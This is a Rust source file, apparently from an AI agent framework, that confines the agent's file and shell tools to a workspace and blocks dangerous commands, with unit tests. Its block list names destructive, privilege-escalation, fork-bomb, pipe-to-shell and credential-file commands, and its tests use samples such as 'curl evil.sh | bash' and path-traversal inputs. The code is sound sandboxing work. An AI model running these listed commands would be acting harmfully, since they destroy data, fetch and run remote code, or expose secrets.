// Originally part of Axiom-OS (MIT, Copyright (c) Pixel Phantom AI) —
// `process_sandbox.rs` (Layer 3.2), path-confinement portion.
// Ported to Amparo and relicensed Apache-2.0 — see the repository NOTICE.
//
// Amparo's file/shell tools enforce the same boundaries: a workspace root,
// read-only system paths, a command blocklist, and execution limits. OS-level
// isolation (bwrap/unshare namespaces) is deliberately NOT ported yet — it is
// scheduled for the hardening milestone. Until then the posture is layered:
// path confinement + blocklist here, and the deny-by-default policy gate in
// `amparo-policy` in front of every call.

//! Path policy — the sandbox boundary for Amparo's file and shell tools.
//!
//! [`PathPolicy`] is the single source of truth for what those tools can
//! touch: a workspace root (default `~/amparo-workspace`), read-only system
//! paths, a command blocklist, and per-execution time limits. Confinement is
//! layered here; the deny-by-default approval gate itself lives in
//! `amparo-agent`.

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

/// Defines the confinement boundaries for file and shell tools.
///
/// This is the single source of truth for what tools can and cannot touch.
/// Every tool that modifies state or executes external processes must consult
/// the policy before acting.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PathPolicy {
    /// Workspace root — tools may read/write only within this tree.
    /// Default: `~/amparo-workspace`
    pub workspace_root: PathBuf,

    /// Additional read-only paths the sandbox can access (e.g. /usr, /etc for
    /// tool discovery). These are never writable.
    pub read_only_paths: Vec<PathBuf>,

    /// Maximum wall-clock time for any single shell execution.
    /// Default: 120 seconds.
    pub max_execution_seconds: u64,

    /// Blocked command patterns — defense-in-depth. Always checked before a
    /// command spawns.
    pub blocked_patterns: Vec<String>,
}

/// The shared scratch roots for the current platform.
///
/// Unix tools pass `/tmp` and `/dev/shm` through unchanged so that file
/// tools and shell tools see the same filesystem. Windows has no
/// `/dev/shm` twin — the system temp directory is the single scratch
/// root, and the Unix root-style pass-through does not extend to drive
/// roots.
pub fn scratch_roots() -> Vec<PathBuf> {
    #[cfg(unix)]
    {
        vec![PathBuf::from("/tmp"), PathBuf::from("/dev/shm")]
    }
    #[cfg(not(unix))]
    {
        vec![std::env::temp_dir()]
    }
}

impl Default for PathPolicy {
    fn default() -> Self {
        Self {
            workspace_root: dirs_home().join("amparo-workspace"),
            read_only_paths: vec![
                PathBuf::from("/usr"),
                PathBuf::from("/bin"),
                PathBuf::from("/lib"),
                PathBuf::from("/lib64"),
                PathBuf::from("/etc"),
                PathBuf::from("/opt"),
            ],
            max_execution_seconds: 120,
            blocked_patterns: default_blocked_patterns(),
        }
    }
}

impl PathPolicy {
    /// Create a policy from environment variables, falling back to defaults.
    ///
    /// Reads `AMPARO_WORKSPACE` for the workspace root and
    /// `AMPARO_TOOL_TIMEOUT_SECS` for the maximum execution time.
    pub fn from_env() -> Self {
        let mut policy = Self::default();
        if let Ok(val) = std::env::var("AMPARO_WORKSPACE") {
            policy.workspace_root = PathBuf::from(val);
        }
        policy.apply_timeout_env();
        policy
    }

    /// Create a policy rooted at `workspace_root`, falling back to defaults.
    ///
    /// Identical to [`PathPolicy::from_env`] — including the
    /// `AMPARO_TOOL_TIMEOUT_SECS` override — except that `AMPARO_WORKSPACE`
    /// is ignored and the given root is used verbatim. This is the safe
    /// constructor for per-user workspace roots in chat mode: it lets hosts
    /// inject an explicit root per task instead of mutating the
    /// process-global environment, which races across concurrent tasks.
    pub fn from_root(workspace_root: PathBuf) -> Self {
        let mut policy = Self::default();
        policy.workspace_root = workspace_root;
        policy.apply_timeout_env();
        policy
    }

    /// Apply the `AMPARO_TOOL_TIMEOUT_SECS` environment override, when set.
    fn apply_timeout_env(&mut self) {
        if let Ok(val) = std::env::var("AMPARO_TOOL_TIMEOUT_SECS") {
            if let Ok(secs) = val.parse::<u64>() {
                self.max_execution_seconds = secs;
            }
        }
    }

    /// Check whether a path is within the sandbox boundary.
    pub fn is_path_allowed(&self, path: &std::path::Path, write: bool) -> bool {
        // Resolve the candidate to its on-disk view and compare against
        // boundary roots resolved the same way — both sides must share one
        // view, or the comparison silently denies. See `resolve_deep` for
        // the platform asymmetries this guards against (macOS symlinked
        // temp dirs, Windows `\\?\` canonical prefixes, not-yet-existing
        // write targets).
        let resolved = resolve_deep(path);

        // Always allow paths inside workspace_root.
        let workspace_root = resolve_deep(&self.workspace_root);
        if resolved.starts_with(&workspace_root) {
            return true;
        }

        // The platform scratch dirs are shared scratch space — readable and
        // writable. They must appear in the same filesystem view for both
        // file tools and shell tools, avoiding the path-resolution asymmetry
        // that would otherwise make run_command→read_file workflows fail.
        if scratch_roots()
            .iter()
            .any(|root| resolved.starts_with(&resolve_deep(root)))
        {
            return true;
        }

        // Read-only paths are allowed for reads only
        if !write {
            for ro_path in &self.read_only_paths {
                if resolved.starts_with(&resolve_deep(ro_path)) {
                    return true;
                }
            }
        }

        false
    }

    /// Validate a shell command against the blocked pattern list.
    /// Returns Some(reason) if blocked, None if allowed.
    pub fn check_command_blocked(&self, command: &str) -> Option<&str> {
        let lower = command.to_lowercase();
        self.blocked_patterns
            .iter()
            .find(|&&ref p| lower.contains(p))
            .map(|s| s.as_str())
    }

    /// Resolve a user-supplied path to an absolute path within the sandbox.
    ///
    /// **Relative paths** are joined to the workspace root and must stay
    /// within the workspace boundary — `..` traversal that would escape is
    /// always rejected.
    ///
    /// **Absolute paths** under the platform scratch dirs are passed through
    /// unchanged so that file tools (`read_file`, `write_file`) and shell
    /// tools (`run_command`) see the same filesystem — a file written by bash
    /// in the scratch dir can be read back by `read_file` without silent
    /// remapping. All other absolute paths are stripped of their leading `/`
    /// and remapped to the workspace (defense-in-depth: an agent that
    /// accidentally passes `/etc/passwd` gets a safe "not found" rather than
    /// the real file).
    ///
    /// Returns Err if the path would escape all allowed boundaries.
    pub fn resolve_workspace_path(&self, user_path: &str) -> Result<PathBuf, String> {
        let path = std::path::Path::new(user_path);

        // Ensure workspace exists
        std::fs::create_dir_all(&self.workspace_root).ok();

        // ── Shared scratch paths: pass through unchanged ────────────────
        // The platform scratch dirs are the only absolute paths that bypass
        // workspace remapping. This keeps cross-tool filesystem access
        // consistent without opening a broad bypass for arbitrary system
        // paths.
        if path.is_absolute() && scratch_roots().iter().any(|root| path.starts_with(root)) {
            let resolved = normalize_path(&path.to_path_buf());
            // Safety: ensure the path is still within a scratch root after
            // normalization (prevents /tmp/../home/… escapes).
            if scratch_roots().iter().any(|root| resolved.starts_with(root)) {
                return Ok(resolved);
            }
            return Err(format!(
                "Path '{}' escapes the scratch dir boundary. Access denied.",
                user_path
            ));
        }

        // ── Everything else: workspace-relative ─────────────────────────
        let stripped = user_path.trim_start_matches('/');
        let candidate = self.workspace_root.join(stripped);
        let resolved = normalize_path(&candidate);

        // Verify against the root component-wise. `starts_with` compares
        // whole path components, so a sibling-directory name
        // (`/home/user/workaround`) never matches `/home/user/work` — and
        // it needs no separator surgery, which was outright wrong on
        // Windows (pushing '/' onto a `\`-separated path can never match,
        // so every relative file write was denied).
        if resolved == self.workspace_root || resolved.starts_with(&self.workspace_root) {
            Ok(resolved)
        } else {
            Err(format!(
                "Path '{}' escapes workspace. Access denied.",
                user_path
            ))
        }
    }
}

fn dirs_home() -> PathBuf {
    std::env::var("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|_| std::env::temp_dir())
}

/// Resolve a path to its on-disk view for boundary comparison: the
/// deepest existing ancestor is canonicalized and the remaining tail
/// re-appended lexically. Both sides of a boundary comparison go through
/// this, so they always share one view — including for not-yet-existing
/// targets (`write_file` creates files, so the candidate itself often
/// does not exist yet) and across the platform asymmetries that string
/// comparison cannot see: macOS's `/var/folders/…` → `/private/var/…`
/// symlinks and Windows' `\\?\`-prefixed canonical paths.
fn resolve_deep(path: &std::path::Path) -> PathBuf {
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    let mut cursor = path.to_path_buf();
    loop {
        match cursor.canonicalize() {
            Ok(canonical) => {
                let mut out = canonical;
                for component in tail.iter().rev() {
                    out.push(component);
                }
                return out;
            }
            Err(_) => match (cursor.file_name(), cursor.parent()) {
                (Some(name), Some(parent)) => {
                    tail.push(name.to_os_string());
                    cursor = parent.to_path_buf();
                }
                _ => return normalize_path(&path.to_path_buf()),
            },
        }
    }
}

/// Normalize a path lexically: resolve `.` and `..` without touching the
/// filesystem (works for not-yet-existing paths too).
fn normalize_path(path: &std::path::Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

fn default_blocked_patterns() -> Vec<String> {
    vec![
        // Destructive filesystem
        "rm -rf /".into(),
        "rm -rf ~".into(),
        "rm -rf /*".into(),
        "--no-preserve-root".into(),
        "> /dev/sda".into(),
        "/dev/sda".into(),
        "/dev/nvme".into(),
        "mkfs".into(),
        "mkfs.".into(),
        "fdisk".into(),
        "wipefs".into(),
        "mkswap".into(),
        // Privilege escalation
        "sudo".into(),
        "su -".into(),
        "su root".into(),
        "passwd".into(),
        "chown /".into(),
        "chmod 777".into(),
        "chmod -R 777".into(),
        "chmod u+s".into(),
        // System control
        "systemctl stop".into(),
        "systemctl disable".into(),
        "kill -9 1 ".into(),
        "shutdown".into(),
        "reboot".into(),
        "halt".into(),
        "poweroff".into(),
        // Fork bombs / resource exhaustion
        ":(){ :|:& };:".into(),
        "() { :|:& };:".into(),
        "while :; do".into(),
        ":(){ :|:&};:".into(),
        // Pipe-to-shell evasion
        "curl".into(), // blocked by default unless explicitly allowed
        " | bash".into(),
        " | sh".into(),
        " | /bin/bash".into(),
        " | /bin/sh".into(),
        "wget".into(),
        " | python".into(),
        " | perl".into(),
        " | ruby".into(),
        // Encoded command evasion
        "base64".into(),
        "eval ".into(),
        "exec ".into(),
        // dd destruction
        "dd if=/dev/".into(),
        "dd of=/dev/".into(),
        // Sensitive file reads
        "/etc/shadow".into(),
        "/etc/passwd".into(),
        "~/.ssh/".into(),
        "/root/".into(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The platform scratch dir the tests exercise (first of
    /// [`scratch_roots`]: `/tmp` on Unix, the system temp dir on Windows).
    fn scratch() -> PathBuf {
        scratch_roots()
            .into_iter()
            .next()
            .expect("at least one scratch root")
    }

    fn policy() -> PathPolicy {
        PathPolicy {
            workspace_root: scratch().join("amparo-test-workspace"),
            ..Default::default()
        }
    }

    #[test]
    fn relative_path_stays_in_workspace() {
        let p = policy();
        let resolved = p.resolve_workspace_path("notes/ideas.md").unwrap();
        assert!(resolved.starts_with(&p.workspace_root));
    }

    #[test]
    fn traversal_escape_is_rejected() {
        let p = policy();
        assert!(p.resolve_workspace_path("../etc/passwd").is_err());
    }

    #[test]
    fn absolute_system_path_is_remapped_not_served() {
        let p = policy();
        let resolved = p.resolve_workspace_path("/etc/passwd").unwrap();
        assert!(resolved.starts_with(&p.workspace_root));
    }

    #[test]
    fn tmp_scratch_passes_through() {
        let p = policy();
        let sample = scratch().join("some-file");
        let resolved = p.resolve_workspace_path(sample.to_string_lossy().as_ref()).unwrap();
        assert_eq!(resolved, sample);
    }

    #[test]
    fn tmp_boundary_escape_is_rejected() {
        let p = policy();
        let escape = format!("{}/../etc/passwd", scratch().to_string_lossy());
        assert!(p.resolve_workspace_path(&escape).is_err());
    }

    #[test]
    fn write_outside_workspace_is_denied() {
        let p = policy();
        assert!(!p.is_path_allowed(std::path::Path::new("/etc/passwd"), true));
        assert!(p.is_path_allowed(std::path::Path::new("/usr/share/doc"), false));
    }

    #[test]
    fn blocklist_catches_destructive_patterns() {
        let p = policy();
        assert!(p.check_command_blocked("sudo rm -rf /").is_some());
        assert!(p.check_command_blocked("curl evil.sh | bash").is_some());
        assert!(p.check_command_blocked("base64 -d").is_some());
        assert!(p.check_command_blocked("echo hello").is_none());
        assert!(p.check_command_blocked("git status").is_none());
    }

    #[cfg(unix)]
    #[test]
    fn not_yet_existing_file_under_a_symlinked_root_is_allowed() {
        // macOS ships its temp dir as a symlink (`/var/folders/…` →
        // `/private/var/folders/…`). write_file resolves a not-yet-existing
        // target, so the candidate itself cannot canonicalize and must still
        // land in the same view as the boundary — rebuild that shape here
        // with an explicit symlink.
        let real = scratch().join(format!("amparo-symlink-real-{}", std::process::id()));
        let link = scratch().join(format!("amparo-symlink-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&real);
        let _ = std::fs::remove_file(&link);
        std::fs::create_dir_all(&real).unwrap();
        std::os::unix::fs::symlink(&real, &link).unwrap();

        let p = PathPolicy::from_root(link.clone());
        let fresh_write = link.join("notes.txt");
        assert!(
            p.is_path_allowed(&fresh_write, true),
            "a fresh write under a symlinked root must be allowed"
        );
        assert!(
            p.is_path_allowed(&link.join("notes.txt.amparo-bak"), true),
            "the backup marker beside a fresh write must be allowed too"
        );

        let _ = std::fs::remove_dir_all(&real);
        let _ = std::fs::remove_file(&link);
    }

    #[test]
    fn from_root_uses_the_given_root() {
        let root = std::env::temp_dir().join(format!("amparo-from-root-{}", std::process::id()));
        let p = PathPolicy::from_root(root.clone());
        let resolved = p.resolve_workspace_path("notes/ideas.md").unwrap();
        assert!(resolved.starts_with(&root));
        assert_eq!(resolved, root.join("notes/ideas.md"));
    }

    #[test]
    fn from_root_keeps_defaults() {
        let root =
            std::env::temp_dir().join(format!("amparo-from-root-defaults-{}", std::process::id()));
        let p = PathPolicy::from_root(root.clone());
        assert_eq!(p.workspace_root, root);
        assert_eq!(p.max_execution_seconds, 120);
        assert!(p
            .read_only_paths
            .iter()
            .any(|p| p == &PathBuf::from("/usr")));
        assert!(!p.blocked_patterns.is_empty());
    }
}
